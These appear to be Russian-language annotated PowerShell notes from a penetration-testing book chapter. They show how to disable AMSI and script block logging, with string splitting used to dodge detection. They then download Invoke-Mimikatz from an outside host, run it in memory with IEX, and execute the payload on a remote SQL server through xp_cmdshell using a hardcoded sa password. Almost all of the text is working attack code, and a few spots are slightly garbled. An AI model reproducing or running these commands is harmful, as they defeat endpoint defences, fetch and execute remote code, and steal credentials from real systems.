### Глава 10 ###

# Борьба с AMSI. Нам требуется обойти AMSI чтобы иметь возможность загрузить Mimikatz в память. 
# Поскольку в своём огороде мы являемся администраторами, мы можем просто отключить AMSI воспользовавшись встроенной командой Set-MpPreference (доступной исключительно в режиме с повышенными правами):
# Отключение АМSI (MS Defender)
Set-MpPreference -DisableIOAVProtection $true

# variant 1
# К счастью, у нас имеется иной вариант, который должен вызывать намного меньше шума:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('a msiInitFailed','NonPublic,Static').SetValue($null,$true)

# variant 2
# Другой вариант можно отыскать в интересной компиляции обхода (автор идеи Сэм Рэйтаншок) находящегося в папке Bypass в файле Invoke-AmsiBypass.ps1.
$utils = [Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')

# Затем мы выполняем выборку ссылки на значение атрибута amsiInitFailed и устанавливаем его в True. 
# Во избежание какого бы то ни было полагающегося на лёгкое соответствие шаблону обнаружения мы пробрасываем это в небольшой конкатенации строки:
$field = $utils.GetField('amsi'+'InitF'+'ailed','NonPublic,Static')
$field.SetValue($null,$true)

##### Mimikatz launcher

# Успешное исполнение Mimikatz после отключения AMSI (test):
$browser = New-Object System.Net.WebClient
$file="https://sf-res.com/Invoke-mimi.ps1"
IEX($browser.DownloadString($file))
Invoke-Mimikatz


# Листинг 10.4. Окончательное сочетание процедуры обхода регистрации записей блоков сценария, отключения AMSI а также запутывающего сценария Invoke-Mimikatz:
# Вначале мы отключаем регистрацию записи блоков сценариев1, затем, как это обсуждалось ранее, мы отключаем AMSI. 
# Мы создаём новый запрос в браузере и копируем имеющиеся настройки прокси в случае, если существуют ограничения на исходящие запросы в Интернет. 
# Наконец, мы выгружаем Invoke-mimi.ps1, наш выставленный ранее персональный сценарий Invoke-Mimikatz и исполняем его а памяти.

# 1) отключаем регистрацию записи блоков сценариев
$utils = [ref].Assembly.GetType('System.Management.Automation.Utils')

$dict = $utils."GetF`Ield"('cachedGroupPolicySettings', 'NonP'+'ublic,Static')

$key = "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBl"+"ockLogging"

$dict.getValue("")[$key]['EnableS'+'criptBlockLogging'] = 0

# 2) отключаем AMSI
$utils = [Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')
$field = $utils.GetField('amsi'+'InitF'+'ailed','NonPublic,Static')
$field.SetValue($null,$true)

# 3) Создаём новый запрос браузера
$browser = New-Object System.Net.WebClient

# 4) Копируем установки прокси
$browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials

# 5) Выгружаем Invoke-mimi.ps1 (mimikatz) и исполняем его в памяти
IEX($browser.DownloadString('https://sf-res.com/Invoke-mimi.ps1'))



# Обычный способ удалённого исполнения сценария в базе данных это сначала закодировать его в base64, а затем исполнить его через xp_cmdshell при помощи следующей команды:
Sql> EXEC xp_cmdshell "powershell.exe -enc <encoded_script>"
		
# Вместо того, чтобы хранить наш свой сценарий в файле или реестре, либо кодирования его в base64, мы сохраним его в переменной среды в удалённой базе данных, воспользовавшись командой set:
$command="set cmd='$utils=[ref].Assembly.Get[...];Invoke-Mimikatz;'"
# Затем нужно просто получить эту переменную из PowerShell и исполнить её содержимое при помощи выглядящего менее подозрительным переключателя команды switch:
$command=$command + ' && powershell -command "(get-item Env:cmd).value | iex"'
$command

# Потом мы встраиваем свою хранящую нашу полезную нагрузку переменную $command в запрос SQL и исполняем его в соответствующей удалённой б#азе данных при помощи xp_cmdshell:
Invoke-SqlCommand -server STRAT-CI-03 -database master -username sa -password L3c3ist3r@87 -query "EXEC xp_cmdshell '$command'"

